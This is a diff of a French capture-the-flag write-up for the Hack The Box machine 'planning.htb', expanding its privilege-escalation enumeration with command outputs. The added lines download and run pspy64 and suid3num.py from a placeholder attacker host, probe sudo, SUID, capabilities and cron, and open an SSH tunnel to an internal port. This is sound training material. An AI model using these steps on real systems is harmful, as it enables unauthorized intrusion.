@@ -720,10 +720,46 @@ La prise pied sur `planning.htb` est maintenant complète.
 
 ## Escalade de privilèges
 
-{{< escalade-intro user="ssh_user" >}}
+{{< escalade-intro user="enzo" >}}
+
+### Surveillance des processus avec pspy64
+
+Une autre vérification classique consiste à surveiller les processus exécutés sur la machine afin d’identifier d’éventuelles tâches automatiques lancées par `root`.
+
+Pour cela, tu ouvres une deuxième session SSH et tu utilises l’outil `pspy64`.
+
+Comme expliqué dans la recette {{< recette "privilege-escalation-linux" >}}, l’objectif est de lancer d’abord l’observation des tâches root puis de continuer l’énumération dans une autre session.
+
+Tu télécharges ensuite l’outil dans un répertoire accessible en écriture :
+
+```bash
+cd /dev/shm
+wget http://10.10.x.x:8000/pspy64
+chmod +x pspy64
+./pspy64
+```
+
+L’objectif est notamment de détecter :
+
+- des scripts exécutés automatiquement par `root`
+- des tâches cron personnalisées
+- des commandes exécutées périodiquement
+- des accès à des fichiers sensibles
+- des binaires exécutés avec des chemins relatifs
+
+Tu laisses ensuite `pspy64` tourner en arrière-plan pendant la suite de l’énumération afin d’observer d’éventuelles tâches exécutées automatiquement par `root`.
 
 ### Sudo -l
-Tu commences toujours par vérifier les droits sudo :
+
+Comme souvent lors d’une phase d’escalade de privilèges Linux, tu commences par vérifier les permissions sudo de l’utilisateur courant :
+
+```bash
+enzo@planning:~$ sudo -l
+[sudo] password for enzo: 
+Sorry, user enzo may not run sudo on planning.
+```
+
+
 
 ### Exploration du contexte utilisateur
 
@@ -739,6 +775,16 @@ hostname
 
 Résultat :
 
+```bash
+enzo
+uid=1000(enzo) gid=1000(enzo) groups=1000(enzo)
+/home/enzo
+Linux planning 6.8.0-59-generic #61-Ubuntu SMP PREEMPT_DYNAMIC Fri Apr 11 23:16:11 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+planning
+```
+
+
+
 ### Recherche de binaires SUID
 Tu poursuis l’énumération en recherchant les **binaires SUID**, qui permettent parfois d’exécuter certaines commandes avec les privilèges de leur propriétaire.
 
@@ -748,7 +794,7 @@ find / -perm -4000 -type f 2>/dev/null
 
 La liste obtenue ne contient que des binaires système classiques tels que :
 
-```texte
+```bash
 /usr/bin/passwd
 /usr/bin/chsh
 /usr/bin/chfn
@@ -757,8 +803,7 @@ La liste obtenue ne contient que des binaires système classiques tels que :
 ...
 ```
 
-Ces binaires sont classiques sur un système Linux et sont généralement présents par défaut.
-Tu n’identifies aucun binaire inhabituel ou directement exploitable.
+Ces résultats ne révèlent aucun binaire SUID inhabituel ni piste exploitable immédiate.
 
 ### Analyse des Linux capabilities
 
@@ -770,14 +815,22 @@ La vérification se fait avec la commande suivante :
 getcap -r / 2>/dev/null
 ```
 
-Ici, tu ne trouves aucune capability inhabituelle ni aucun binaire exploitable.
+Résultat :
 
-### Vérification des SUID avec suid3num.py
+```bash
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
+/usr/bin/ping cap_net_raw=ep
+/usr/bin/mtr-packet cap_net_raw=ep
+```
+
+Ces résultats ne révèlent aucune capability inhabituelle ni piste exploitable immédiate.
+
+### Analyse complémentaire avec suid3num.py
 
 Pour compléter l’analyse des binaires SUID, tu utilises l’outil suid3num.py, qui permet d’identifier rapidement :
 
-les binaires SUID intéressants
-leur présence éventuelle dans GTFOBins
+- les binaires SUID intéressants
+- leur présence éventuelle dans GTFOBins
 
 Tu le télécharges et l’exécutes depuis un répertoire en mémoire (/dev/shm) :
 
@@ -786,6 +839,18 @@ cd /dev/shm
 wget http://10.10.x.x:8000/suid3num.py
 python3 suid3num.py
 ```
+
+L’analyse confirme principalement la présence de binaires système classiques :
+
+```bash
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/umount
+...
+```
+
 L’outil confirme que :
 
 - tous les binaires SUID présents sont standards
@@ -804,26 +869,60 @@ Les crons système peuvent être consultés avec :
 cat /etc/crontab
 ```
 
+Résultat :
+
+```bash
+17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
+47 6	* * 7	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
+52 6	1 * *	root	test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
+```
+
+Aucune tâche personnalisée ni script modifiable par l’utilisateur `enzo` n’apparaît ici.
+
 ### Analyse des services locaux
-Tu vérifies ensuite les **services en cours d’exécution**, ce qui permet parfois d’identifier une application vulnérable ou un service mal configuré.
+
+Tu vérifies ensuite les ports en écoute sur la machine afin d’identifier d’éventuels services accessibles uniquement depuis localhost.
 
 ```
 netstat -tulpn
 ```
 
-### pspy64
-Tu lances également pspy64 dans une deuxième session SSH afin d’observer en temps réel les processus exécutés sur la machine, notamment ceux lancés par root.
+Résultat : 
 
-Tu le télécharges et l’exécutes depuis un répertoire persistant (/var/tmp) :
+```bash
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:38247         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+udp        0      0 127.0.0.54:53           0.0.0.0:*                           -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -    
+```
 
-cd /var/tmp
-wget http://10.10.x.x:8000/pspy64
-chmod +x pspy64
-./pspy64
+Le port `8000` écoute uniquement sur `127.0.0.1`, ce qui signifie qu’il n’est pas accessible directement depuis l’extérieur.
 
-L’objectif est d’identifier des tâches exécutées automatiquement par root pouvant être exploitables.
+Pour analyser ce service depuis ta machine Kali, tu mets en place un tunnel SSH local avec l’option `-L`.
 
-Dans ce cas précis, aucun processus exploitable n’apparaît dans cette deuxième session, même en redémarrant la première session SSH.
+```bash
+ssh -L 8001:127.0.0.1:8000 enzo@planning.htb  
+enzo@planning.htb's password: 
+Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)
+```
+
+Le service devient alors accessible localement depuis ton navigateur via :
+
+```url
+http://127.0.0.1:8001
+```
+
+
 
 ### Conclusion de l’énumération manuelle
 
